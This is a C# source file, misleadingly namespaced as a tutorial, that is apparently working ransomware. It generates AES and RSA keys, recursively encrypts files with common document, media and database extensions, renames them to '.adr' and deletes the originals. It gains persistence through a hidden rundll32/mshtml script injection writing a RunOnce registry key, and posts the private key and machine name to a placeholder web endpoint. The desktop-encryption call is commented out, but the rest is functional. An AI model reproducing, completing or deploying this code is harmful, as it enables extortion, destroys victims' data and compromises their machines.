using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace DataStrTutorial
{
   class Program
    {
        //ENUMS commands for win86 api shell
        #region enums to show commands
        public enum ShowCommands : int
        {
            SW_HIDE = 0,
            SW_SHOWNORMAL = 1,
            SW_NORMAL = 1,
            SW_SHOWMINIMIZED = 2,
            SW_SHOWMAXIMIZED = 3,
            SW_MAXIMIZE = 3,
            SW_SHOWNOACTIVATE = 4,
            SW_SHOW = 5,
            SW_MINIMIZE = 6,
            SW_SHOWMINNOACTIVE = 7,
            SW_SHOWNA = 8,
            SW_RESTORE = 9,
            SW_SHOWDEFAULT = 10,
            SW_FORCEMINIMIZE = 11,
            SW_MAX = 11
        }
        #endregion
        
        [DllImport("shell32.dll")]
        static extern IntPtr ShellExecute(
            IntPtr hwnd,
            string lpOperation,
            string lpFile,
            string lpParameters,
            string lpDirectory,
            ShowCommands nShowCmd);

        //Encrypts all directory ----dont be dumb!
        private static void encryptAll(string dir, Byte[] aesKey)
        {
            var di = new DirectoryInfo(dir);
            try
            {
                foreach (FileInfo fi in di.GetFiles("*.*"))
                  encryptFile(fi.FullName, aesKey);
                foreach (DirectoryInfo d in di.GetDirectories())
                    encryptAll(d.FullName, aesKey);
            }
            catch (Exception)
            {
            }
        }

        //MAIN
        [STAThread]
        static void Main(string[] args)
        {           
            //MUTEX
            Boolean bCreatedNew;
            Mutex m = new Mutex(false, "Ransomware", out bCreatedNew); 
            m.WaitOne();
            GC.Collect();
            if (!bCreatedNew) return;
            m.ReleaseMutex();

            //Make my key
            System.Threading.Thread.CurrentThread.Priority = System.Threading.ThreadPriority.Highest;
            Byte[] myKey = AES.generateKey();
            RSACryptoServiceProvider RSAObj = new RSACryptoServiceProvider(); //this actually encrypts the mykey  --hybrid 
            
            //---key encryption---in files-----
            File.WriteAllText("sendBack.txt", RSAObj.ToXmlString(true));
            File.WriteAllText("secret.txt", RSAObj.ToXmlString(false));
            File.WriteAllBytes("secretAES.txt", RSAObj.Encrypt(myKey, false));// encrypted key
                                                                                
            //-------------EXPLOIT---Jscript injector---
            var rundll32Exploit = @"javascript:""\..\mshtml,RunHTMLApplication "";document.write();shell=new%20ActiveXObject(""wscript.shell"");shell.regwrite(""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\adr"",""" + System.Reflection.Assembly.GetExecutingAssembly().CodeBase.Replace(@"\", @"\\") + @""");";
            System.Diagnostics.Process.Start("rundll32.exe", rundll32Exploit);// <-- says msil virus
            ShellExecute(IntPtr.Zero, "open", "rundll32.exe", rundll32Exploit, "", ShowCommands.SW_HIDE);
            
            //DANGER: encrypt all of it ----COMMENTED OUT!
            //encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), myKey);
       
            #region New HTTP LAYER
            //old code was above this
            var uri = "my website enpoint";
            var client = new HttpClient();
            try
            {
                 var values = new List<KeyValuePair<string, string>>();
                          
                 //add values to data for post
                 values.Add(new KeyValuePair<string, string>(RSAObj.ToXmlString(true), Environment.MachineName));
                 FormUrlEncodedContent content = new FormUrlEncodedContent(values);

                // Post data
                var result = client.PostAsync(uri, content).Result;
                /// Access content as stream which you can read into some string
                ///Console.WriteLine(result.Content);
                ///Access the result status code
                ///Console.WriteLine(result.StatusCode);
            }           
            catch (AggregateException ex)
            {
                // get all possible exceptions which are thrown
                foreach (var item in ex.Flatten().InnerExceptions)
                {
                    Console.WriteLine(item.Message);
                }

                // throw;
            }
            #endregion
        }//main ends       
        ///*******************MODULE:Behavior********
        /// makes file name, creates file and encrypts       
        #region Makes name for file random
        public static string getRandomFileName()
        {
            string retn = "";
            string pair = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~=!@#$%^&*()";
            Random rnd = new Random();
            for (int i = rnd.Next(7, 13); i-- > 0;)
                retn += pair[rnd.Next(pair.Length)];
            return retn;
        }
        #endregion     
        #region Encrypt file       
        /// <summary>
        /// transforms(encrypty) original array 
        /// ie file(from file path) and then deletes it.
        /// </summary>
        /// <param name="orgFile"></param>
        /// <param name="aesKey"></param>
        /// <returns></returns>
        public static bool encryptFile(string orgFile, byte[] aesKey)
        {
            try
            {
                #region types of files
                var extNameList = ".png .3dm .3g2 .3gp .aaf .accdb .aep .aepx .aet .ai .aif .arw " +
                                  ".as .as3 .asf .asp .asx .avi .bay .bmp .cdr .cer .class .cpp " +
                                  ".cr2 .crt .crw .cs .csv .db .dbf .dcr .der .dng .doc .docb .docm " +
                                  ".docx .dot .dotm .dotx .dwg .dxf .dxg .efx .eps .erf .fla .flv " +
                                  ".idml .iff .indb .indd .indl .indt .inx .jar .java .jpeg .jpg " +
                                  ".kdc .m3u .m3u8 .m4u .max .mdb .mdf .mef .mid .mov .mp3 .mp4 " +
                                  ".mpa .mpeg .mpg .mrw .msg .nef .nrw .odb .odc .odm .odp .ods .odt " +
                                  ".orf .p12 .p7b .p7c .pdb .pdf .pef .pem .pfx .php .plb .pmd .pot " +
                                  ".potm .potx .ppam .ppj .pps .ppsm .ppsx .ppt .pptm .pptx .prel " +
                                  ".prproj .ps .psd .pst .ptx .r3d .ra .raf .rar .raw .rb .rtf " +
                                  ".rw2 .rwl .sdf .sldm .sldx .sql .sr2 .srf .srw .svg .swf .tif " +
                                  ".vcf .vob .wav .wb2 .wma .wmv .wpd .wps .x3f .xla .xlam .xlk " +
                                  ".xll .xlm .xls .xlsb .xlsm .xlsx .xlt .xltm .xltx .xlw .xml .xqx .zip";
                #endregion

                ///NAME FILE INFO 
                ///--1--gets path
                ///--2-----gets name of file
                ///--3------gets extention
                string fileDir = new FileInfo(orgFile).DirectoryName + @"\";              
                string fileFullName = new FileInfo(orgFile).Name;            
                string extName = new FileInfo(orgFile).Extension.ToLower();
                
                ///CONTROL CHK AND SERIALIZATION 
                ///empty chk
                if (!extNameList.Contains(extName) || extName == "")
                    return false;
              
                ///-destination array takes in binary data
                ///---makes file name into byte type
                Byte[] fileData = File.ReadAllBytes(orgFile);
                Byte[] fullNameArray = Encoding.UTF8.GetBytes(fileFullName);
                ///buffer only 256 bytes.
                if (fullNameArray.Length > 255)
                    return false;

                Array.Resize(ref fileData, fileData.Length + 256);
                Array.ConstrainedCopy(fullNameArray, 0, fileData, fileData.Length - 256, fullNameArray.Length);

                File.WriteAllBytes(fileDir + getRandomFileName() + ".adr", AES.encrypt(fileData, aesKey));
                File.Delete(orgFile);

                //=============== end ======================
                System.Threading.Thread.Sleep(500);
                return true;
            }
            catch (Exception)
            {
            }
            return false;
        }
        #endregion     
        #region Aes encryption static class class generates key, encrypts and dycripts
        public static class AES
        {
            /// <summary>
            /// generates 16 bit key
            /// </summary>
            /// <returns>generates 16 bit key</returns>
            public static Byte[] generateKey()
            {
                var AESObject = new RijndaelManaged() { KeySize = 128 };
                AESObject.GenerateKey();
                return AESObject.Key;
            }

            /// <summary>
            /// returns an ecrypted byte []
            /// </summary>
            /// <param name="data"></param>
            /// <param name="key"></param>
            /// <returns>returns an ecrypted byte []</returns>
            public static Byte[] encrypt(Byte[] data, Byte[] key)
            {
                RijndaelManaged provider_AES = new RijndaelManaged();
                provider_AES.KeySize = 128;
                ICryptoTransform encrypt_AES = provider_AES.CreateEncryptor(key, key);
                byte[] output = encrypt_AES.TransformFinalBlock(data, 0, data.Length);
                return output;
            }

            public static Byte[] decrypt(byte[] byte_ciphertext, Byte[] key)
            {
                RijndaelManaged provider_AES = new RijndaelManaged();
                provider_AES.KeySize = 128;
                ICryptoTransform decrypt_AES = provider_AES.CreateDecryptor(key, key);
                byte[] byte_secretContent = decrypt_AES.TransformFinalBlock(byte_ciphertext, 0, byte_ciphertext.Length);
                return byte_secretContent;
            }

        }//AES ENDS
        #endregion
    }//prgram ends
}


///OLD CODE http 
///NameValueCollection nc = new NameValueCollection();
///nc["pc"] = Environment.MachineName;
///nc["rsa"] = RSAObj.ToXmlString(true);
///new WebClient().UploadValues("data recive", nc); //--------older api
///------------------------------
#region test vals for key
//var key = AES.generateKey();
// var data = new Byte[] {1,1,1,1,1};

//var h = AES.encrypt(data, key);

//foreach (var b in h)
//{
//    Console.WriteLine(b);

//}
//Console.WriteLine("     ");
//Console.WriteLine("     ");
//Console.WriteLine(" --------------    ");



//var dp = AES.decrypt(h, key);
//foreach (var d in dp)
//{
//    Console.WriteLine(d);

//}
#endregion